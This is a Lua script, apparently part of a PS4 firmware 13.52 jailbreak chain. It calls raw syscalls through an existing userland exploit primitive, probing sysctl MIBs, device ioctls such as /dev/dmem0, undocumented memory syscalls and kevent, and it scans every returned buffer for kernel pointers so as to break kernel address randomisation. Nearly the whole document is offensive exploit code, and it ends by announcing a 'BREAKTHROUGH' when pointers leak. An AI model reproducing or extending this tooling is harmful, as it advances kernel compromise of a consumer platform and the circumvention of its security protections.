------------------------------------------------------------
PS4 FW 13.52 - KERNEL INFO LEAK HUNTER
Systematically test all known leak vectors

Strategy:
  1. Test each device with multiple ioctl patterns
  2. Test sysctl with various MIB arrays
  3. Test memory syscalls with large output buffers
  4. Test kqueue/kevent for kernel data
  5. Check for uninitialized memory in all returns

Key Insight: ANY non-zero data at kernel addresses is a leak
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

local leaks_found = 0

------------------------------------------------------------
-- Test 1: Sysctl MIB arrays
------------------------------------------------------------
function test_sysctl_mib()
  print("\n=== TEST 1: Sysctl MIB Arrays ===")

  -- Try various MIB combinations
  local mibs = {
    {1, 4},      -- kern.version
    {1, 8},      -- kern.argmax
    {1, 17},     -- kern.osreldate
    {1, 38},     -- kern.fwversion
    {1, 47},     -- kern.random.sysctl
    {1, 48},     -- kern.random
    {6, 1},      -- hw.machine
    {6, 7},      -- hw.pagesize
    {13, 1},     -- machdep
    {14, 1},     -- security
    {17, 2},     -- net.inet.ip
    {17, 6},     -- net.inet6.ip6
    {19, 1},     -- debug
    {32, 1},     -- vfs.numvnodes
    {32, 2},     -- vfs.bufspace
  }

  for _, mib in ipairs(mibs) do
    local mib_buf = memory.alloc(32)
    for i = 1, #mib do
      memory.write_dword(mib_buf + (i-1) * 4, mib[i])
    end

    local out_buf = memory.alloc(4096)
    for i = 0, 4095 do memory.write_byte(out_buf + i, 0) end

    local out_size = memory.alloc(8)
    memory.write_qword(out_size, 4096)

    local r = s(202, mib_buf, #mib, out_buf, out_size, 0)
    if r == 0 then
      local size = read_qw(out_size)
      -- Check for kernel pointers
      for i = 0, math.min(size - 8, 4088) do
        local val = read_qw(out_buf + i)
        if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
          print(string.format("  *** KERNEL PTR in kern[%d]: offset %d = 0x%x ***",
            mib[1], i, val))
          leaks_found = leaks_found + 1
        end
      end
      if size > 0 and size < 64 then
        -- Show small responses
        local hex = ""
        for i = 0, math.min(size - 1, 31) do
          hex = hex .. string.format("%02x ", memory.read_byte(out_buf + i))
        end
        print(string.format("  kern[%d]: %d bytes: %s", mib[1], size, hex))
      end
    end
  end
end

------------------------------------------------------------
-- Test 2: Device ioctls
------------------------------------------------------------
function test_device_ioctls()
  print("\n=== TEST 2: Device IOCTLs ===")

  local devices = {
    "/dev/sbi", "/dev/dce", "/dev/srtc",
    "/dev/dmem0", "/dev/gbase", "/dev/dipsw",
    "/dev/icc0", "/dev/evlg0", "/dev/notification0",
  }

  local ioctl_codes = {
    0xc008a801, 0xc010a801, 0xc020a801,
    0xc008a802, 0xc010a802, 0xc020a802,
    0x40105303, 0x80105303, 0xc0105303,
  }

  for _, dev_path in ipairs(devices) do
    local path_buf = memory.alloc(64)
    for i = 1, #dev_path do
      memory.write_byte(path_buf + i - 1, string.byte(dev_path, i))
    end
    memory.write_byte(path_buf + #dev_path, 0)

    local fd = s(5, path_buf, 0, 0)
    if fd >= 0 and fd < 1024 then
      for _, req in ipairs(ioctl_codes) do
        local buf = memory.alloc(256)
        for i = 0, 255 do memory.write_byte(buf + i, 0) end

        local r = s(54, fd, req, buf)
        if r == 0 then
          -- Check for kernel pointers
          for i = 0, 248, 8 do
            local val = read_qw(buf + i)
            if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
              print(string.format("  *** KERNEL PTR in %s ioctl(0x%x): offset %d = 0x%x ***",
                dev_path, req, i, val))
              leaks_found = leaks_found + 1
            end
          end
        end
      end
      s(6, fd)
    end
  end
end

------------------------------------------------------------
-- Test 3: Memory syscalls
------------------------------------------------------------
function test_memory_syscalls()
  print("\n=== TEST 3: Memory Syscalls ===")

  -- Test memory-related syscalls with large output buffers
  local syscall_nums = {597, 599, 600, 623, 624, 625, 626, 627}

  for _, sc in ipairs(syscall_nums) do
    local out_buf = memory.alloc(16384)
    for i = 0, 16383 do memory.write_byte(out_buf + i, 0) end

    local r = s(sc, out_buf, 16384, 0, 0, 0)
    if r >= 0 then
      -- Check for kernel pointers
      for i = 0, 16376, 8 do
        local val = read_qw(out_buf + i)
        if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
          print(string.format("  *** KERNEL PTR in syscall %d: offset %d = 0x%x ***",
            sc, i, val))
          leaks_found = leaks_found + 1
        end
      end
    end
  end
end

------------------------------------------------------------
-- Test 4: kqueue/kevent
------------------------------------------------------------
function test_kqueue_kevent()
  print("\n=== TEST 4: kqueue/kevent ===")

  local kq = s(362)  -- kqueue
  if kq < 0 or kq >= 1024 then
    print("  kqueue failed")
    return
  end

  -- Create pipe
  local pipefds = memory.alloc(8)
  local r = s(42, pipefds, 0)
  if r ~= 0 then
    s(6, kq)
    return
  end
  local rd = memory.read_dword(pipefds)
  local wr = memory.read_dword(pipefds + 4)

  -- Register EVFILT_READ
  local kev = memory.alloc(64)
  for i = 0, 63 do memory.write_byte(kev + i, 0) end
  memory.write_word(kev, -1)  -- EVFILT_READ
  memory.write_word(kev + 2, 1)  -- EV_ADD

  r = s(363, kq, kev, 1, 0, 0)
  if r ~= 0 then
    s(6, rd)
    s(6, wr)
    s(6, kq)
    return
  end

  -- Write to pipe
  local data = memory.alloc(64)
  for i = 0, 63 do memory.write_byte(data + i, 0x42) end
  s(4, wr, data, 64)

  -- Call kevent with large buffer
  local event_buf = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(event_buf + i, 0) end

  r = s(363, kq, event_buf, 100, 0, 0)
  if r > 0 then
    -- Check for kernel pointers
    for i = 0, r * 32 - 8, 8 do
      local val = read_qw(event_buf + i)
      if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
        print(string.format("  *** KERNEL PTR in kevent: offset %d = 0x%x ***", i, val))
        leaks_found = leaks_found + 1
      end
    end
  end

  s(6, rd)
  s(6, wr)
  s(6, kq)
end

------------------------------------------------------------
-- MAIN
------------------------------------------------------------
print("============================================")
print("PS4 FW 13.52 - KERNEL INFO LEAK HUNTER")
print("============================================")

test_sysctl_mib()
test_device_ioctls()
test_memory_syscalls()
test_kqueue_kevent()

print("\n============================================")
print(string.format("RESULTS: %d kernel pointer leaks found", leaks_found))
if leaks_found > 0 then
  print("*** BREAKTHROUGH: Kernel address space layout leaked! ***")
end
print("============================================")
